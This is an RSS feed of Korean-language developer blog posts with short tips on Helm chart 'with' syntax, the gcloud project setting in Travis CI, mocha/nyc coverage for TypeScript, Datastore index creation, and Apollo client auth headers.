<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[Micalgenus's RSS Feed]]></title><description><![CDATA[Full-Stack developer using node.js]]></description><link>https://micalgenus.github.io</link><generator>GatsbyJS</generator><lastBuildDate>Fri, 06 Jan 2023 13:17:09 GMT</lastBuildDate><item><title><![CDATA[Helm chart에서 with 문법]]></title><description><![CDATA[Helm chart를 직접 구성할 때 여러 컨트롤 플로우가 있는데, 그 중 with이라는 문법이 신기해서 기억에 남는다. 다른 언어로 비교하면 this문법과 비슷하다고 생각하는데, if condition…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Sat, 08 Aug 2020 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Helm chart를 직접 구성할 때 여러 컨트롤 플로우가 있는데, 그 중 with이라는 문법이 신기해서 기억에 남는다.&lt;/p&gt;
&lt;p&gt;다른 언어로 비교하면 this문법과 비슷하다고 생각하는데, if condition의 기능을 하면서도 &lt;code class=&quot;language-text&quot;&gt;this&lt;/code&gt;를 변경하는 기능이라고 생각할 수 있다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;yaml&quot;&gt;&lt;pre class=&quot;language-yaml&quot;&gt;&lt;code class=&quot;language-yaml&quot;&gt;&lt;span class=&quot;token key atrule&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;token key atrule&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;
  &lt;span class=&quot;token key atrule&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;와 같이 있다고 할 때 다음과 같이 사용할 수 있다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;yaml&quot;&gt;&lt;pre class=&quot;language-yaml&quot;&gt;&lt;code class=&quot;language-yaml&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt; with .Values.test &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;token key atrule&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; .a &lt;span class=&quot;token punctuation&quot;&gt;|&lt;/span&gt; default &quot;a&quot; &lt;span class=&quot;token punctuation&quot;&gt;|&lt;/span&gt; quote &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;token key atrule&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; .b &lt;span class=&quot;token punctuation&quot;&gt;|&lt;/span&gt; default &quot;b&quot; &lt;span class=&quot;token punctuation&quot;&gt;|&lt;/span&gt; quote &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt; end &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;helm chart에서 &lt;code class=&quot;language-text&quot;&gt;.&lt;/code&gt;을  &lt;code class=&quot;language-text&quot;&gt;this&lt;/code&gt;라고 볼 수 있는데, &lt;code class=&quot;language-text&quot;&gt;with&lt;/code&gt;을 사용하면 기존의 &lt;code class=&quot;language-text&quot;&gt;.&lt;/code&gt;을 새로운 값으로 덮어쓸 수 있다. 그래서 해당 문법을 사용할 때 기존에 있던 값중에 필요한 값이 있다면 해당 값을 저장해 둔 후 사용하는 것이 좋다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;yaml&quot;&gt;&lt;pre class=&quot;language-yaml&quot;&gt;&lt;code class=&quot;language-yaml&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; $Release &lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;= .Release &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt; with .Value.test &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;token key atrule&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; .a &lt;span class=&quot;token punctuation&quot;&gt;|&lt;/span&gt; default $Release.Name &lt;span class=&quot;token punctuation&quot;&gt;|&lt;/span&gt; quote &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt; end &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;참고: &lt;a href=&quot;https://helm.sh/docs/chart_template_guide/control_structures/&quot;&gt;공식문서&lt;/a&gt;&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Travis-ci 환경에서 gcloud 프로젝트 설정]]></title><description><![CDATA[Travis-ci를 사용하여 gcloud명령어를 사용할 경우 Travis내부 설정에 의해서 프로젝트 ID가 제대로 적용되지 않는 경우가 있다. 이 경우 와 로 프로젝트 ID…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Sun, 14 Jul 2019 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Travis-ci를 사용하여 gcloud명령어를 사용할 경우 Travis내부 설정에 의해서 프로젝트 ID가 제대로 적용되지 않는 경우가 있다.&lt;/p&gt;
&lt;p&gt;이 경우 &lt;code class=&quot;language-text&quot;&gt;eco-emissary-99515&lt;/code&gt;와 &lt;code class=&quot;language-text&quot;&gt;travis-ci-prod-2&lt;/code&gt;로 프로젝트 ID가 설정돼서 아래와 같은 에러가 발생하였다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;ERROR: (gcloud.app.versions.list) User [portfolio@micalgenus-com.iam.gserviceaccount.com] does not have permission to access app [eco-emissary-99515] (or it may not exist): The caller does not have permission&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이 문제를 해결하기 위해서 traivs에서 내부적으로 &lt;code class=&quot;language-text&quot;&gt;CLOUDSDK_CORE_PROJECT&lt;/code&gt;환경변수를 추가하여 해결하였다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;yaml&quot;&gt;&lt;pre class=&quot;language-yaml&quot;&gt;&lt;code class=&quot;language-yaml&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# .traivs.yml&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;# ... 생략&lt;/span&gt;
&lt;span class=&quot;token key atrule&quot;&gt;before_script&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;token comment&quot;&gt;# ... 생략&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt; export CLOUDSDK_CORE_PROJECT=$GCLOUD_PROJECT
&lt;span class=&quot;token comment&quot;&gt;# ... 생략&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content:encoded></item><item><title><![CDATA[Babel을 이용한 Typescript환경에서 mocha coverage사용하기]]></title><description><![CDATA[Babel을 이용하여 Typescript를 사용하게 될 경우 mocha를 사용하기 위해서는 babel-register를 사용해야 한다. 와 같이 파일을 만들어준다. babel…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Fri, 26 Apr 2019 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Babel을 이용하여 Typescript를 사용하게 될 경우 mocha를 사용하기 위해서는 babel-register를 사용해야 한다.&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;mocha.init.js&lt;/code&gt;와 같이 파일을 만들어준다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;javascript&quot;&gt;&lt;pre class=&quot;language-javascript&quot;&gt;&lt;code class=&quot;language-javascript&quot;&gt;&lt;span class=&quot;token function&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;@babel/register&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;token literal-property property&quot;&gt;extensions&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;.ts&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;.tsx&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;babel &lt;strong&gt;7&lt;/strong&gt;버전 이상의 경우 &lt;code class=&quot;language-text&quot;&gt;@bable/register&lt;/code&gt;를 그 이전의 버전은 &lt;code class=&quot;language-text&quot;&gt;babel-register&lt;/code&gt;를 사용하면 된다.&lt;/p&gt;
&lt;p&gt;위와 같이 적용하면 &lt;code class=&quot;language-text&quot;&gt;.babelrc&lt;/code&gt;파일을 적용시킬 수 있다. &lt;code class=&quot;language-text&quot;&gt;babel-preset-typescript&lt;/code&gt;를 사용하여 typescript를 사용한다.&lt;/p&gt;
&lt;p&gt;mocha의 coverage를 사용하기 위해서 &lt;a href=&quot;https://istanbul.js.org/&quot;&gt;nyc&lt;/a&gt;라는 라이브러리를 사용한다. 이를 사용하기 위해서 &lt;code class=&quot;language-text&quot;&gt;.nycrc&lt;/code&gt;파일을 생성한다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;json&quot;&gt;&lt;pre class=&quot;language-json&quot;&gt;&lt;code class=&quot;language-json&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token property&quot;&gt;&quot;include&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;src/**/*.ts&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;token property&quot;&gt;&quot;extension&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;.ts&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;token property&quot;&gt;&quot;exclude&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;src/**/*.d.ts&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;src/tests/**/*&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;token property&quot;&gt;&quot;reporter&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;lcov&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;text&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;token property&quot;&gt;&quot;all&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;true&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;다음과 같은 설정처럼 사용할 수 있다. &lt;code class=&quot;language-text&quot;&gt;extension&lt;/code&gt;옵션을 통하여 typescript파일을 허용하면 mocha를 이용하여 &lt;code class=&quot;language-text&quot;&gt;coverage&lt;/code&gt;를 측정할 수 있다.&lt;/p&gt;
&lt;p&gt;그 후 다음과 같은 명령어를 사용하면 coverage가 측정된다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;$ nyc mocha -r ./mocha.init.js ./src/tests/**/*.spec.ts&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content:encoded></item><item><title><![CDATA[Google Cloud Datastore 인덱스 수동 생성]]></title><description><![CDATA[Google Cloud Datastore를 사용할 때 order를 사용하기 위해서는 index를 만들어야한다. 이를 만들기 위해서 를 사용할 수 있다. 는 Google Cloud Platform Console…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Tue, 02 Apr 2019 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Google Cloud Datastore를 사용할 때 order를 사용하기 위해서는 index를 만들어야한다.&lt;/p&gt;
&lt;p&gt;이를 만들기 위해서 &lt;code class=&quot;language-text&quot;&gt;gcloud&lt;/code&gt;를 사용할 수 있다. &lt;code class=&quot;language-text&quot;&gt;gcloud&lt;/code&gt;는 Google Cloud Platform Console에 들어가면 &lt;code class=&quot;language-text&quot;&gt;Cloud Shell&lt;/code&gt;을 이용하여 쉽게 사용할 수 있다.&lt;/p&gt;
&lt;p&gt;우선 수동으로 index를 만들기 위해서는 정의를 해줘야 한다. &lt;code class=&quot;language-text&quot;&gt;index.yml&lt;/code&gt;을 다음과 같이 작성한다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;yml&quot;&gt;&lt;pre class=&quot;language-yml&quot;&gt;&lt;code class=&quot;language-yml&quot;&gt;&lt;span class=&quot;token key atrule&quot;&gt;indexes&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;

&lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;token key atrule&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; Task
  &lt;span class=&quot;token key atrule&quot;&gt;ancestor&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; no
  &lt;span class=&quot;token key atrule&quot;&gt;properties&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;token key atrule&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; done
  &lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;token key atrule&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; priority
    &lt;span class=&quot;token key atrule&quot;&gt;direction&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; desc

&lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;token key atrule&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; Task
  &lt;span class=&quot;token key atrule&quot;&gt;properties&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;token key atrule&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; collaborators
    &lt;span class=&quot;token key atrule&quot;&gt;direction&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; asc
  &lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;token key atrule&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; created
    &lt;span class=&quot;token key atrule&quot;&gt;direction&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; desc

&lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;token key atrule&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; TaskList
  &lt;span class=&quot;token key atrule&quot;&gt;ancestor&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; yes
  &lt;span class=&quot;token key atrule&quot;&gt;properties&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;token key atrule&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; percent_complete
    &lt;span class=&quot;token key atrule&quot;&gt;direction&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; asc
  &lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;token key atrule&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; type
    &lt;span class=&quot;token key atrule&quot;&gt;direction&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; asc&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;하고자 하는 정렬에 따라서 내용을 채우면 된다.&lt;/p&gt;
&lt;p&gt;그 후, 다음 명령어를 통하여 인덱스를 생성 할 수 있다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;$ gcloud datastore indexes create index.yml&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;참고: &lt;a href=&quot;https://cloud.google.com/datastore/docs/tools/indexconfig#Datastore_About_index_yaml&quot;&gt;공식문서&lt;/a&gt;&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Apollo client에 헤더 추가하기]]></title><description><![CDATA[Apollo client를 사용할 때, header를 설정하려면 ApolloClient를 다음과 같이 하면된다. 를 사용하여 를 만든 후, link에 을 이용하여 적용시켜주면 된다.]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Sat, 30 Mar 2019 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Apollo client를 사용할 때, header를 설정하려면 ApolloClient를 다음과 같이 하면된다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;javascript&quot;&gt;&lt;pre class=&quot;language-javascript&quot;&gt;&lt;code class=&quot;language-javascript&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; ApolloClient &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;apollo-client&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; ApolloLink&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; concat &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;apollo-link&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; createHttpLink &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;apollo-link-http&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; InMemoryCache &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;apollo-cache-inmemory&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; fetch &lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;isomorphic-fetch&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; httpLink &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;createHttpLink&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;token literal-property property&quot;&gt;uri&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token constant&quot;&gt;URL&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; fetch &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; authMiddleware &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ApolloLink&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token parameter&quot;&gt;operation&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; forward&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  operation&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;setContext&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;token literal-property property&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;token string-property property&quot;&gt;&apos;x-access-token&apos;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;getLoginToken&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;forward&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;forward&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;operation&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; client &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ApolloClient&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token literal-property property&quot;&gt;link&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;concat&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;authMiddleware&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; httpLink&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;token literal-property property&quot;&gt;cache&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;InMemoryCache&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
